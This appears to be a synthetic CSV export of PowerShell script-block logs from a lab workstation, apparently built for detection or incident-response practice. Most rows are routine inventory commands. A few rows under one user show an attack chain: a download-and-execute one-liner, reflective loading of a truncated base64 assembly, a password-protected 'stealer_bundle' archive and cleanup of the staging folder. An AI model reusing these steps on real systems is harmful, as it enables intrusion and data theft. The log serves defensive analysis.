RecordNumber,EventId,TimeCreated,Computer,User,ScriptBlockId,MessageNumber,MessageTotal,ScriptBlockText
1001,4104,2026-04-12T09:00:12.014Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{08fa1c30-1234-11ef-8a11-0050569c1234},1,1,"prompt"
1002,4104,2026-04-12T09:03:07.500Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{18ab34aa-5678-11ef-b2c3-0050569c5678},1,1,"Import-Module Microsoft.PowerShell.Diagnostics"
1003,4104,2026-04-12T09:03:07.512Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{18ab34aa-5678-11ef-b2c3-0050569c5678},1,1,"Get-WinEvent -MaxEvents 20"
1004,4104,2026-04-12T09:22:00.001Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{20cc11d0-1231-4a55-b301-0050569c9999},1,1,"schtasks /Query /FO CSV | ConvertFrom-Csv"
1004b,4104,2026-04-12T09:05:12.014Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{21b011cc-0af1-4a19-bd30-0050569c8801},1,1,"Get-CimInstance -Namespace root/ccm/policy -ClassName CCM_ApplicationCIAssignment | Select-Object AssignmentID,AssignmentAction"
1004c,4104,2026-04-12T09:05:31.221Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{22c11201-c4b7-4e9d-8a01-0050569c8802},1,1,"$r = Invoke-WebRequest -Uri 'https://sccm.northwind.lab/apps/Chrome/latest.json' -UseBasicParsing; $meta = $r.Content | ConvertFrom-Json; Write-Output $meta.version"
1004d,4104,2026-04-12T09:07:44.311Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{22c11202-c4b8-4a19-a1f0-0050569c8803},1,1,"Get-HotFix | Sort-Object -Property InstalledOn -Descending | Select-Object -First 20"
1004e,4104,2026-04-12T09:10:11.021Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{22c11203-c4b9-4a19-a1f0-0050569c8804},1,1,"Set-MpPreference -SubmitSamplesConsent SendSafeSamples"
1004f,4104,2026-04-12T09:12:00.221Z,FIN-WKS-07,NORTHWIND\edr-collector,{22c11204-c4ba-4a19-a1f0-0050569c8805},1,1,"Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | Select ProductName,CurrentBuild,ReleaseId"
1005,4104,2026-04-12T09:40:47.240Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{9c58b210-6541-42f1-9b04-2e91b7fdf1a1},1,1,"iwr -useb http://10.10.42.200:8080/x.txt | iex"
1006,4104,2026-04-12T09:40:48.902Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{60421b12-1c31-4c60-91fb-3210f95b9021},1,1,"$b64='TVqQAAMAAAAEAAAA//...(truncated - 12,384 chars)...AAAA=='; $p=[System.Convert]::FromBase64String($b64); $a=[System.Reflection.Assembly]::Load($p); $a.EntryPoint.Invoke($null,@(,[string[]]@()))"
1007,4104,2026-04-12T09:41:04.100Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{25dd0022-88ab-4c11-a5a1-0050569caaaa},1,1,"Get-CimInstance -ClassName Win32_OperatingSystem | Select Caption,Version,BuildNumber"
1008,4104,2026-04-12T09:41:15.331Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{25dd0022-88ab-4c11-a5a1-0050569caaaa},1,1,"Get-Service | Where-Object {$_.Status -eq 'Running'} | Measure-Object"
1008b,4104,2026-04-12T09:41:18.021Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{25dd0022-88ab-4c11-a5a1-0050569cbbbb},1,1,"Get-NetTCPConnection -State Established | Group-Object -Property State | Sort-Object -Property Count -Descending"
1009a,4104,2026-04-12T09:24:11.481Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{2ff10021-1a11-4b11-a3c1-0050569ccc01},1,1,"$policy = Invoke-WebRequest -Uri 'https://sccm.northwind.lab/policy/machine' -Method Get -UseDefaultCredentials; $policy.Content | Out-Null"
1009b,4104,2026-04-12T09:30:11.021Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{2ff10022-1a12-4b11-a3c1-0050569ccc02},1,1,"choco --version"
1009c,4104,2026-04-12T09:30:11.221Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{2ff10023-1a13-4b11-a3c1-0050569ccc03},1,1,"iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))"
1010,4104,2026-04-12T09:41:31.881Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{60421b12-1c31-4c60-91fb-3210f95b9021},1,1,"& 'C:\Program Files\7-Zip\7z.exe' a -pStG!7ip-42-nw -mx=1 $env:TEMP+'\WwaCJ7z\stealer_bundle.zip' $env:TEMP+'\WwaCJ7z\'"
1011,4104,2026-04-12T09:41:35.220Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{25dd0022-88ab-4c11-a5a1-0050569caaaa},1,1,"Get-EventLog -LogName Application -Newest 200 | Where-Object {$_.EntryType -eq 'Error'}"
1012,4104,2026-04-12T09:42:00.001Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{31eab410-2f0a-4801-9200-0050569cbbbc},1,1,"Get-CimInstance -ClassName Win32_LogicalDisk | Select DeviceID,Size,FreeSpace"
1013,4104,2026-04-12T09:42:11.400Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{31eab411-2f0a-4801-9200-0050569cbbbd},1,1,"Get-WmiObject -Namespace root\ccm\clientsdk -Class CCM_SoftwareUpdate | Where {$_.EvaluationState -lt 8}"
1014,4104,2026-04-12T09:41:41.514Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{60421b12-1c31-4c60-91fb-3210f95b9021},1,1,"Remove-Item -Path ($env:TEMP + '\WwaCJ7z') -Recurse -Force"
1015,4104,2026-04-12T09:44:04.011Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{31eab411-2f0a-4801-9200-0050569cbbbe},1,1,"Restart-Service -Name BITS"
1016,4104,2026-04-12T09:45:00.500Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{31eab412-2f0a-4801-9200-0050569cbbc1},1,1,"$svc = Get-Service -Name 'Winmgmt'; if ($svc.Status -ne 'Running') { Start-Service $svc }"
1017,4104,2026-04-12T09:47:00.100Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{31eab413-2f0a-4801-9200-0050569cbbc2},1,1,"Get-EventLog -LogName System -Newest 500 | Where {$_.EntryType -eq 'Warning'} | Measure-Object | Select Count"
1018,4104,2026-04-12T09:48:01.220Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{31eab414-2f0a-4801-9200-0050569cbbc3},1,1,"Get-Process -IncludeUserName | Group-Object UserName | Select Count,Name"
1019,4104,2026-04-12T09:49:22.021Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{31eab415-2f0a-4801-9200-0050569cbbc4},1,1,"$b = [Convert]::FromBase64String('SGVsbG8gTm9ydGh3aW5kIQ=='); [System.Text.Encoding]::UTF8.GetString($b)"
1020,4104,2026-04-12T09:50:00.081Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{31eab411-2f0a-4801-9200-0050569cbbbb},1,1,"Update-MpSignature -SignatureUpdateService MicrosoftUpdateServer"
1021,4104,2026-04-12T09:51:11.101Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{31eab416-2f0a-4801-9200-0050569cbbc5},1,1,"Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,NISEnabled,QuickScanEndTime"
1022,4104,2026-04-12T09:53:11.100Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{31eab417-2f0a-4801-9200-0050569cbbc6},1,1,"gpresult /R /SCOPE COMPUTER"
1023,4104,2026-04-12T09:55:00.001Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{31eab418-2f0a-4801-9200-0050569cbbc7},1,1,"Get-CimInstance -ClassName Win32_QuickFixEngineering | Sort HotFixID -Descending | Select -First 30"
1024,4104,2026-04-12T09:57:12.011Z,FIN-WKS-07,NORTHWIND\edr-collector,{45db1200-c101-4f11-b911-0050569cdddd},1,1,"Get-Process | Sort-Object -Descending CPU | Select-Object -First 30 Name,Id,CPU"
1025,4104,2026-04-12T09:57:12.221Z,FIN-WKS-07,NORTHWIND\edr-collector,{45db1201-c102-4f11-b911-0050569cdddd},1,1,"Get-NetTCPConnection -State Established | Select LocalAddress,LocalPort,RemoteAddress,RemotePort,OwningProcess | ConvertTo-Json -Compress"
1027a,4104,2026-04-12T09:06:11.001Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{31eab419-2f0a-4801-9200-0050569cbbca},1,1,"Get-CimInstance -ClassName Win32_ComputerSystem | Select Manufacturer,Model,TotalPhysicalMemory"
1027b,4104,2026-04-12T09:08:22.221Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{31eab420-2f0a-4801-9200-0050569cbbcb},1,1,"Get-EventLog -LogName System -Newest 100 | Where-Object {$_.EventID -eq 7036}"
1027c,4104,2026-04-12T09:11:22.401Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{31eab421-2f0a-4801-9200-0050569cbbcc},1,1,"Get-CimInstance -Namespace root/ccm -ClassName SMS_Client | Select ClientVersion"
1027d,4104,2026-04-12T09:14:44.121Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{31eab422-2f0a-4801-9200-0050569cbbcd},1,1,"Get-ScheduledTask | Where-Object {$_.State -eq 'Ready'} | Measure-Object | Select Count"
1027e,4104,2026-04-12T09:18:11.401Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{31eab423-2f0a-4801-9200-0050569cbbce},1,1,"Get-CimInstance -ClassName Win32_NetworkAdapter | Where-Object {$_.NetEnabled -eq $true} | Select Name,MACAddress"
